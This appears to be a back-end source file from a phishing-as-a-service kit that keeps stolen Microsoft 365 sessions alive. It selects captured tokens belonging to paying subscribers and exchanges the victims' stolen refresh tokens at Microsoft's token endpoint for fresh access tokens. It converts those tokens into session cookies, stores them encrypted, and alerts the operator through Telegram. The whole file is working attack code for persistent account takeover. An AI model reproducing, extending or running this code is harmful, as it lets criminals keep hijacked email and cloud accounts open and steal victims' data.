const db = require('../database/connection');
const { decrypt, encrypt } = require('../utils/encrypt');
const { convertTokensToCookies } = require('./cookieconverter');
const axios = require('axios');
const config = require('../config/env');

async function runRenewalCycle() {
  const windowHours = config.RENEWAL_WINDOW_HOURS;
  const maxAttempts = config.MAX_RENEWAL_ATTEMPTS;
  
  const [captures] = await db.query(
    `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type
     FROM captured_tokens ct
     JOIN users u ON ct.user_id = u.id
     LEFT JOIN links l ON ct.link_id = l.id
     WHERE ct.token_type = 'cookie'
       AND ct.deleted = 0
       AND ct.stale = 0
       AND ct.renewal_attempts < ?
       AND u.subscription_status = 'active'
       AND (u.subscription_expiry IS NULL OR u.subscription_expiry > NOW())
       AND (ct.expiration IS NULL OR ct.expiration < DATE_ADD(NOW(), INTERVAL ? HOUR))`,
    [maxAttempts, windowHours]
  );
  
  for (const capture of captures) {
    await renewSingleCapture(capture);
  }
}

async function renewSingleCapture(capture) {
  try {
    const refreshToken = decrypt(capture.refresh_token_encrypted);
    if (!refreshToken) {
      await markStale(capture.id, 'No refresh token available');
      return { success: false, error: 'No refresh token' };
    }
    
    // Call Microsoft token endpoint with refresh token
    const response = await axios.post(
      `https://login.microsoftonline.com/common/oauth2/v2.0/token`,
      new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        client_id: config.AZURE_CLIENT_ID,
        scope: 'openid profile email offline_access https://graph.microsoft.com/.default',
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );
    
    const newAccessToken = response.data.access_token;
    const newRefreshToken = response.data.refresh_token || refreshToken;
    
    // Convert to cookies
    const cookieResult = await convertTokensToCookies(
      newAccessToken,
      capture.template_type || 'office'
    );
    
    if (cookieResult.success && cookieResult.cookies) {
      const ttlHours = config.COOKIE_DEFAULT_TTL_HOURS;
      
      await db.query(
        `UPDATE captured_tokens 
         SET access_token_encrypted = ?, refresh_token_encrypted = ?,
             cookies_encrypted = ?, expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
             last_renewed = NOW(), renewal_count = renewal_count + 1,
             renewal_attempts = 0, stale = 0
         WHERE id = ?`,
        [encrypt(newAccessToken), encrypt(newRefreshToken), encrypt(cookieResult.cookies),
         ttlHours, capture.id]
      );
      
      // Log renewal
      await db.query(
        'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address) VALUES (?, ?, 1, ?)',
        [capture.id, capture.user_id, '127.0.0.1']
      );
      
      // Notify user via Telegram
      await notifyUser(capture.user_id, `🔄 Cookies renewed for capture #${capture.id}`);
      
      return { success: true, cookies: cookieResult.cookies };
    } else {
      await handleRenewalFailure(capture);
      return { success: false, error: cookieResult.error };
    }
  } catch (err) {
    await handleRenewalFailure(capture);
    return { success: false, error: err.message };
  }
}

async function handleRenewalFailure(capture) {
  const newAttempts = (capture.renewal_attempts || 0) + 1;
  const maxAttempts = config.MAX_RENEWAL_ATTEMPTS;
  
  if (newAttempts >= maxAttempts) {
    await db.query('UPDATE captured_tokens SET stale = 1, renewal_attempts = ? WHERE id = ?', [newAttempts, capture.id]);
    await notifyUser(capture.user_id, `⚠️ Cookie renewal failed permanently for capture #${capture.id}. Marked as stale.`);
  } else {
    await db.query('UPDATE captured_tokens SET renewal_attempts = ? WHERE id = ?', [newAttempts, capture.id]);
  }
  
  await db.query(
    'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, error_message) VALUES (?, ?, 0, ?, ?)',
    [capture.id, capture.user_id, '127.0.0.1', 'Renewal failed after ' + newAttempts + ' attempts']
  );
}

async function markStale(captureId, reason) {
  await db.query('UPDATE captured_tokens SET stale = 1 WHERE id = ?', [captureId]);
}

async function notifyUser(userId, message) {
  try {
    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [userId]);
    if (users.length && users[0].notify_prt && users[0].telegram_id && users[0].telegram_bot_token) {
      await axios.post(`https://api.telegram.org/bot${users[0].telegram_bot_token}/sendMessage`, {
        chat_id: users[0].telegram_id,
        text: message,
      });
    }
  } catch (e) { /* silent */ }
}

module.exports = { runRenewalCycle, renewSingleCapture };